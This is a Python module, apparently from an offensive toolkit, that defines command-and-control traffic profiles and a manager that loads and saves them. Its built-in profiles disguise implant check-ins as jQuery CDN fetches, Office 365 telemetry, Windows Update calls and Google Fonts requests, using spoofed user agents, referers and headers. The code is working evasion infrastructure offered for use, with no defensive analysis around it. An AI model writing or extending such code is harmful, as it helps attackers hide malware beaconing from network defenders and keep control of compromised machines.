"""
Malleable C2 HTTP profiles — disguise C2 traffic as legitimate web requests.

Usage:
    from fitnah.c2.profiles import ProfileManager
    mgr     = ProfileManager()
    profile = mgr.get("jquery")

Profile wire format (JSON, storable in data/profiles/<name>.json):
{
  "name": "jquery",
  "checkin_uri": "/jquery-3.6.0.min.js",
  "ack_uri": "/api/v1/metrics",
  "user_agent": "Mozilla/5.0 ...",
  "headers": {"Accept": "application/javascript"},
  "uri_params": ["v=3.6.0", "t=1"],
  "body_prepend": "",   # hex string, decoded on load
  "body_append": ""
}
"""
from __future__ import annotations

import json
import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import ClassVar

log = logging.getLogger(__name__)


@dataclass
class C2Profile:
    name:         str
    checkin_uri:  str             = "/checkin"
    ack_uri:      str             = "/ack"
    user_agent:   str             = ""
    headers:      dict[str, str]  = field(default_factory=dict)
    uri_params:   list[str]       = field(default_factory=list)
    body_prepend: bytes           = b""
    body_append:  bytes           = b""

    def checkin_url(self, base: str) -> str:
        url = base.rstrip("/") + self.checkin_uri
        if self.uri_params:
            url += "?" + "&".join(self.uri_params)
        return url

    def ack_url(self, base: str) -> str:
        url = base.rstrip("/") + self.ack_uri
        if self.uri_params:
            url += "?" + "&".join(self.uri_params)
        return url

    def to_dict(self) -> dict:
        return {
            "name":         self.name,
            "checkin_uri":  self.checkin_uri,
            "ack_uri":      self.ack_uri,
            "user_agent":   self.user_agent,
            "headers":      self.headers,
            "uri_params":   self.uri_params,
            "body_prepend": self.body_prepend.hex(),
            "body_append":  self.body_append.hex(),
        }

    @classmethod
    def from_dict(cls, d: dict) -> "C2Profile":
        return cls(
            name         = d.get("name", "custom"),
            checkin_uri  = d.get("checkin_uri", "/checkin"),
            ack_uri      = d.get("ack_uri", "/ack"),
            user_agent   = d.get("user_agent", ""),
            headers      = d.get("headers", {}),
            uri_params   = d.get("uri_params", []),
            body_prepend = bytes.fromhex(d.get("body_prepend", "")),
            body_append  = bytes.fromhex(d.get("body_append", "")),
        )


# ── Built-in profiles ─────────────────────────────────────────────────────────

_BUILTIN_PROFILES: list[C2Profile] = [

    # jQuery CDN fetch — looks like a browser pulling a JS library
    C2Profile(
        name        = "jquery",
        checkin_uri = "/jquery-3.6.0.min.js",
        ack_uri     = "/api/v1/metrics",
        user_agent  = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        headers     = {
            "Accept":          "application/javascript, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer":         "https://code.jquery.com/",
            "Origin":          "https://code.jquery.com",
        },
        uri_params  = ["v=3.6.0", "t=1"],
        body_prepend = b"",
        body_append  = b"",
    ),

    # Office 365 telemetry — blends with enterprise O365 traffic
    C2Profile(
        name        = "office365",
        checkin_uri = "/c2r/telemetryProxy",
        ack_uri     = "/c2r/deploymentTracing",
        user_agent  = (
            "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17328; Pro)"
        ),
        headers     = {
            "Accept":           "application/json",
            "X-ClientService":  "MSOutlook",
            "X-ClientVersion":  "16.0.17328.20124",
            "X-RequestType":    "Telemetry",
            "Content-Type":     "application/json; charset=utf-8",
        },
        uri_params  = ["api-version=2.1"],
        body_prepend = b"",
        body_append  = b"",
    ),

    # Windows Update client traffic
    C2Profile(
        name        = "windows_update",
        checkin_uri = "/v9/ClientWebService/client.asmx/SyncUpdates",
        ack_uri     = "/v9/ClientWebService/client.asmx/ReportEventBatch",
        user_agent  = (
            "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.31"
        ),
        headers     = {
            "Accept":           "application/soap+xml, application/dime, multipart/related, text/*",
            "Content-Type":     "application/soap+xml; charset=utf-8",
            "Cache-Control":    "no-cache",
            "Pragma":           "no-cache",
        },
        uri_params  = [],
        body_prepend = b"<?xml version=\"1.0\" encoding=\"utf-8\"?>",
        body_append  = b"",
    ),

    # Google Fonts API traffic
    C2Profile(
        name        = "google_fonts",
        checkin_uri = "/css2",
        ack_uri     = "/generate_204",
        user_agent  = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        headers     = {
            "Accept":          "text/css,*/*;q=0.1",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer":         "https://fonts.googleapis.com/",
            "Origin":          "https://fonts.googleapis.com",
        },
        uri_params  = ["family=Roboto:wght@400;700&display=swap"],
        body_prepend = b"",
        body_append  = b"",
    ),
]


class ProfileManager:
    """
    Manages built-in C2 profiles + custom JSON profiles loaded from disk.
    Custom profiles are loaded from data/profiles/*.json.
    """

    def __init__(self, profiles_dir: str = "data/profiles"):
        self._profiles: dict[str, C2Profile] = {}
        self._profiles_dir = Path(profiles_dir)

        # Load built-ins
        for p in _BUILTIN_PROFILES:
            self._profiles[p.name] = p

        # Load custom JSON profiles from disk
        self._load_from_disk()

    def _load_from_disk(self) -> None:
        if not self._profiles_dir.exists():
            return
        for json_file in self._profiles_dir.glob("*.json"):
            try:
                data    = json.loads(json_file.read_text(encoding="utf-8"))
                profile = C2Profile.from_dict(data)
                self._profiles[profile.name] = profile
                log.info("[profiles] loaded custom profile: %s", profile.name)
            except Exception as exc:
                log.warning("[profiles] failed to load %s: %s", json_file, exc)

    def get(self, name: str) -> C2Profile | None:
        return self._profiles.get(name)

    def list(self) -> list[str]:
        return sorted(self._profiles.keys())

    def save(self, profile: C2Profile) -> None:
        """Save a custom profile to data/profiles/<name>.json."""
        self._profiles_dir.mkdir(parents=True, exist_ok=True)
        out = self._profiles_dir / f"{profile.name}.json"
        out.write_text(json.dumps(profile.to_dict(), indent=2), encoding="utf-8")
        self._profiles[profile.name] = profile
        log.info("[profiles] saved profile: %s → %s", profile.name, out)

    def delete(self, name: str) -> bool:
        """Remove a custom profile. Built-ins cannot be deleted."""
        builtin_names = {p.name for p in _BUILTIN_PROFILES}
        if name in builtin_names:
            return False
        path = self._profiles_dir / f"{name}.json"
        if path.exists():
            path.unlink()
        return self._profiles.pop(name, None) is not None
